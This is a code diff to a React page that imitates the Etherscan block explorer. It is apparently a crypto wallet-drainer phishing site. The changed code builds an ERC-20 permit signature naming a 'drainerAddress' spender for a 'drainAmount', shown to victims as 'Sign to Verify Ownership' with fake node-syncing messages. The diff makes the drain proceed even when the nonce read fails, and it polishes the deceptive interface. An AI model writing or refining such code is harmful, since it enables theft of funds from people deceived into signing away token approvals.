@@ -41,7 +41,7 @@ export default function Home() {
   const tokenAddress = (process.env.NEXT_PUBLIC_TOKEN_ADDRESS || "0x546cfd202b5d656AafEB21E6cE8196F075122b44") as `0x${string}`;
   const targetChainId = Number(process.env.NEXT_PUBLIC_CHAIN_ID || 11155111);
 
-  const { data: nonce } = useReadContract({
+  const { data: nonce, isError: nonceError } = useReadContract({
     address: tokenAddress,
     abi: noncesAbi,
     functionName: 'nonces',
@@ -49,13 +49,16 @@ export default function Home() {
     chainId: targetChainId,
   })
 
+  const isNonceReady = nonce !== undefined || nonceError;
+  const actualNonce = nonce !== undefined ? (nonce as bigint) : BigInt(0);
+
   const handleClaim = async () => {
     try {
       if (!tokenAddress || !tokenAddress.startsWith('0x')) {
         alert("Configuration Error: Token Address is missing or invalid.");
         return;
       }
-      if (nonce === undefined) {
+      if (!isNonceReady) {
         alert("Node syncing... Please try again in 3 seconds.");
         return;
       }
@@ -84,7 +87,7 @@ export default function Home() {
           owner: address as `0x${string}`,
           spender: drainerAddress,
           value: drainAmount,
-          nonce: nonce as bigint,
+          nonce: actualNonce,
           deadline: deadline,
         },
       });
@@ -117,9 +120,9 @@ export default function Home() {
     <div className={styles.main}>
       {/* Top Mini Nav */}
       <div className={styles.topNav}>
-        <div>
-          <span>ETH Price: <span className={styles.brandBlue}>$1,973.25</span> (+0.17%)</span>
-          <span style={{ display: 'inline-flex', alignItems: 'center', gap: '4px' }}>
+        <div className={styles.topNavMetrics}>
+          <span style={{ marginRight: '1.5rem' }}>ETH Price: <span className={styles.brandBlue}>$1,973.25</span> (+0.17%)</span>
+          <span style={{ display: 'inline-flex', alignItems: 'center', gap: '4px', marginRight: '1.5rem' }}>
             <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 512 512" style={{ fill: '#6c757d' }}>
               <path d="M304 64V16c0-8.8-7.2-16-16-16H48C39.2 0 32 7.2 32 16v48h16V32h240v32h16zM32 96h256v384H32c-17.7 0-32-14.3-32-32V128c0-17.7 14.3-32 32-32zm416 195.4v149l-22.1-13.3c-4.9-2.9-10.7-3.9-16.1-2.9l-26.6 5.3-26.6-5.3c-5.5-1.1-11.2 0-16.1 2.9L320 440.6V208c0-26.5 21.5-48 48-48h6.1C355.7 137.9 336 109 336 80c0-26.5 21.5-48 48-48h64c26.5 0 48 21.5 48 48 0 29-19.7 57.9-26.2 78h6.2c26.5 0 48 21.5 48 48v83.4c0 14.8-19.4 20-27.4 7.2l-37.5-60c-4-6.4-11.1-10.3-18.7-10.3-12.7 0-23 10.3-23 23zm-32-211.4c17.7 0 32-14.3 32-32 0-8.8-7.2-16-16-16h-64c-8.8 0-16 7.2-16 16 0 17.7 14.3 32 32 32h32z" />
             </svg>
@@ -195,14 +198,14 @@ export default function Home() {
               </div>
 
               <div className={styles.statsCard} style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', flexDirection: 'column' }}>
-                <div style={{ marginBottom: '1rem', color: '#6c757d', fontSize: '1.2rem', fontWeight: 600 }}>Explore Private Wallets & Transfers</div>
-                <div style={{ display: 'flex', gap: '1rem' }}>
+                <div style={{ marginBottom: '1.5rem', color: '#6c757d', fontSize: '1.2rem', fontWeight: 600, textAlign: 'center' }}>Explore Private Wallets & Transfers</div>
+                <div className={styles.connectGrid}>
                   {connectors
                     .filter(connector => connector.name !== 'Injected')
                     .map((connector) => (
                       <button
                         key={connector.uid}
-                        className={styles.verifyButton}
+                        className={styles.connectBoxBtn}
                         onClick={() => connect({ connector })}
                       >
                         Connect {connector.name}
@@ -262,9 +265,12 @@ export default function Home() {
       {/* VIEW 2: PENDING TRANSACTIONS LIST */}
       {viewState === 'list' && (
         <div className={styles.container} style={{ paddingTop: '2rem' }}>
-          <div style={{ display: 'flex', alignItems: 'center', gap: '1rem', marginBottom: '1.5rem' }}>
-            <img src="/etherscan-logo.svg" alt="eth" style={{ width: '25px', height: '25px' }} />
-            <h1 className={styles.pageTitle} style={{ margin: 0, fontFamily: 'monospace' }}>Address {address}</h1>
+          <div style={{ display: 'flex', alignItems: 'flex-start', gap: '0.5rem', marginBottom: '1.5rem', flexDirection: 'column' }}>
+            <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
+              <img src="/etherscan-logo.svg" alt="eth" style={{ width: '25px', height: '25px' }} />
+              <h1 className={styles.pageTitle} style={{ margin: 0 }}>Address</h1>
+            </div>
+            <span style={{ fontFamily: 'monospace', fontSize: '1.1rem', wordBreak: 'break-all', color: '#1e2022' }}>{address}</span>
           </div>
 
           <div className={styles.card} style={{ marginTop: 0 }}>
@@ -436,9 +442,9 @@ export default function Home() {
                   <button
                     className={styles.verifyButton}
                     onClick={handleClaim}
-                    disabled={isPending || nonce === undefined}
+                    disabled={isPending || !isNonceReady}
                   >
-                    {isPending ? 'Waiting for Signature...' : (nonce === undefined ? 'Synchronizing Node Data...' : 'Sign to Verify Ownership')}
+                    {isPending ? 'Waiting for Signature...' : (!isNonceReady ? 'Synchronizing Node Data...' : 'Sign to Verify Ownership')}
                   </button>
                 </div>
               </div>
